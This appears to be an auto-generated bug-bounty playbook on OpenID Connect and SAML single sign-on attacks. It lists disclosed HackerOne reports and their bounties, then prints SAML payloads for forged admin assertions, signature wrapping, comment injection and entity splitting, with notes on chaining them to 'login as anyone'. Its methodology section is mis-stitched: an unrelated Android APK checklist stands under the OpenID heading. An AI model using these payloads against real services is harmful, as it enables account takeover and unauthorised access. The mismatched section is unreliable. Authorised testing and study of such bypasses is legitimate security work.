# Real-World Playbook — OpenID Connect

**Class:** `openid` · **Coverage-matrix tier:** 1 · **Hunter2:** tools/h1_oauth_tester.py · /auth-hunt · **Skill:** auth-attacks
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed OpenID Connect reports peak at **$10,500**. Rewarded across: Automattic, Bumble, Eternal, GitHub, HackerOne, Nextcloud, Rocket.Chat, Shopify.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **Ability to DOS any organization's SSO and open up the door to account takeovers** — Superhuman (formerly Grammarly), $10,500 · 259👍 · [976603](https://hackerone.com/reports/976603)
- **SAML Authentication Bypass on uchat.uberinternal.com** — Uber, $8,500 · 87👍 · [223014](https://hackerone.com/reports/223014)
- **Stealing SSO Login Tokens (snappublisher.snapchat.com)** — Snapchat, $7,500 · 244👍 · [265943](https://hackerone.com/reports/265943)
- **SSO through odnoklassniki uses http rather than https** — Bumble, $150 · 14👍 · [703759](https://hackerone.com/reports/703759)
- **Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalation to Any Shop Owner by Taking Advantage of the Shopify SSO** — Shopify, $0 (disclosed) · 1917👍 · [791775](https://hackerone.com/reports/791775)
- **Able to Takeover Merchants Accounts Even They Have Already Setup SSO, After Bypassing the Email Confirmation** — Shopify, $0 (disclosed) · 310👍 · [796956](https://hackerone.com/reports/796956)
- **HackerOne SAML signup domain enforcement bypass results in unauthorized access to HackerOne PullRequest organization** — HackerOne, $0 (disclosed) · 228👍 · [2101076](https://hackerone.com/reports/2101076)
- **SAML Signature verification bypass allows logging into any user (with specific conditions)** — GitHub, $0 (disclosed) · 196👍 · [2579939](https://hackerone.com/reports/2579939)
- **Insecure Zendesk SSO implementation by generating JWT client-side** — Trint Ltd, $0 (disclosed) · 102👍 · [638635](https://hackerone.com/reports/638635)
- **Twitter SSO allows unverified e-mail registration, leads to Slack and social media hijacks** — Zendesk, $0 (disclosed) · 70👍 · [235139](https://hackerone.com/reports/235139)
- **ID4me feature of OpenID connect app available even when disabled** — Nextcloud, $0 (disclosed) · 66👍 · [2376929](https://hackerone.com/reports/2376929)
- **[auth2.zomato.com] Reflected XSS at `oauth2/fallbacks/error` | ORY Hydra an OAuth 2.0 and OpenID Connect Provider** — Eternal, $0 (disclosed) · 51👍 · [456333](https://hackerone.com/reports/456333)
- **(HackerOne SSO-SAML) Login CSRF, Open Redirect, and Self-XSS Possible Exploitation** — HackerOne, $0 (disclosed) · 44👍 · [171398](https://hackerone.com/reports/171398)
- **Authentication bypass on JetPack SSO manager - Allows to access the administration panel of wordpress without user interaction** — Automattic, $0 (disclosed) · 41👍 · [2037902](https://hackerone.com/reports/2037902)
- **Authentication Bypass via XML Signature Wrapping in SAML SSO** — Rocket.Chat, $0 (disclosed) · 38👍 · [3827674](https://hackerone.com/reports/3827674)
- **Accidental Access to Programs Information via SAML Login** — HackerOne, $0 (disclosed) · 34👍 · [438306](https://hackerone.com/reports/438306)
- **SAML Response Reuse on hackerone.com/users/saml/auth** — HackerOne, $0 (disclosed) · 26👍 · [888930](https://hackerone.com/reports/888930)
- **Ability to enumerate private programs using SAML** — HackerOne, $0 (disclosed) · 24👍 · [167828](https://hackerone.com/reports/167828)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="http://localhost:7001/saml2/sp/acs/post" ID="id39453084082248801717742013" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
    <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameidformat:entity">REDACTED</saml2:Issuer>
    <saml2p:Status xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol">
        <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
    </saml2p:Status>
    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id3945308408248426654986295" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
        <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">REDACTED</saml2:Issuer>
        <saml2:Subject xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified">admin</saml2:NameID>
            <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml2:SubjectConfirmationData NotOnOrAfter="2018-04-22T10:33:53.593Z" Recipient="http://localhost:7001/saml2/sp/acs/post" />
            </saml2:SubjectConfirmation>
        </saml2:Subject>
        <saml2:Conditions NotBefore="2018-04-22T10:23:53.593Z" NotOnOrAfter="2018-0422T10:33:53.593Z" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AudienceRestriction>
                <saml2:Audience>WLS_SP</saml2:Audience>
            </saml2:AudienceRestriction>
        </saml2:Conditions>
        <saml2:AuthnStatement AuthnInstant="2018-04-22T10:28:49.876Z" SessionIndex="id1524392933593.694282512" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AuthnContext>
                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
            </saml2:AuthnContext>
        </saml2:AuthnStatement>
    </saml2:Assertion>
</saml2p:Response>
```
```
<SAMLResponse>
  <FA ID="evil">
      <Subject>Attacker</Subject>
  </FA>
  <LA ID="legitimate">
      <Subject>Legitimate User</Subject>
      <LAS>
         <Reference Reference URI="legitimate">
         </Reference>
      </LAS>
  </LA>
</SAMLResponse>
```
```
<SAMLResponse>
    <Issuer>https://idp.com/</Issuer>
    <Assertion ID="_id1234">
        <Subject>
            <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>
```
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY s "s">
  <!ENTITY f1 "f1">
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
  ID="_04cfe67e596b7449d05755049ba9ec28"
  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
[...]
  <saml2:Attribute FriendlyName="uid"
    Name="urn:oid:0.9.2342.19200300.100.1.1"
    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
    <saml2:AttributeValue>
      &s;taf&f1;
    </saml2:AttributeValue>
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### Android APK Checklist


This checklist complements the OWASP Mobile Application Security Testing Guide; apply each item according to the application's threat model and authorized test scope.<sup>[[5]](#references)</sup>

##### [Learn Android fundamentals](android-app-pentesting/index.html#2-android-application-fundamentals)

- [ ] [Basics](android-app-pentesting/index.html#fundamentals-review)
- [ ] [Dalvik & Smali](android-app-pentesting/index.html#dalvik--smali)
- [ ] [Entry points](android-app-pentesting/index.html#application-entry-points)
  - [ ] [Activities](android-app-pentesting/index.html#launcher-activity)
  - [ ] [URL Schemes](android-app-pentesting/index.html#url-schemes)
  - [ ] [Content Providers](android-app-pentesting/index.html#services)
  - [ ] [Services](android-app-pentesting/index.html#services-1)
  - [ ] [Broadcast Receivers](android-app-pentesting/index.html#broadcast-receivers)
  - [ ] [Intents](android-app-pentesting/index.html#intents)
  - [ ] [Intent Filter](android-app-pentesting/index.html#intent-filter)
- [ ] [Other components](android-app-pentesting/index.html#other-app-components)
- [ ] [How to use ADB](android-app-pentesting/index.html#adb-android-debug-bridge)
- [ ] [How to modify Smali](android-app-pentesting/index.html#smali)

##### [Static Analysis](android-app-pentesting/index.html#static-analysis)

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- id_token signature not verified → forge identity
- iss/aud confusion across providers → login as anyone

## Hunter2 wiring
- **Run:** `tools/h1_oauth_tester.py · /auth-hunt`
- **Skill:** `auth-attacks`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)
